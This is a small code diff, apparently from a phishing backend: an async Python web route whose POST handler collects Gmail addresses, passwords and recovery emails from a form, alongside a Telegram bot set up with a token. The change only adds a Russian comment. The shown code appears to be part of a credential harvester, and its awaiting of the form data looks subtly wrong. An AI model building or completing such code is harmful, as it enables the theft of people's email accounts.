@@ -14,6 +14,7 @@ bot = Bot(token=telegram_token)
 @app.route("/", methods=["GET", "POST"])
 async def form():
     if request.method == "POST":
+        # Асинхронное получение данных формы
         gmail = await request.form.get("gmail")
         password = await request.form.get("password")
         recovery_email = await request.form.get("recovery_email")
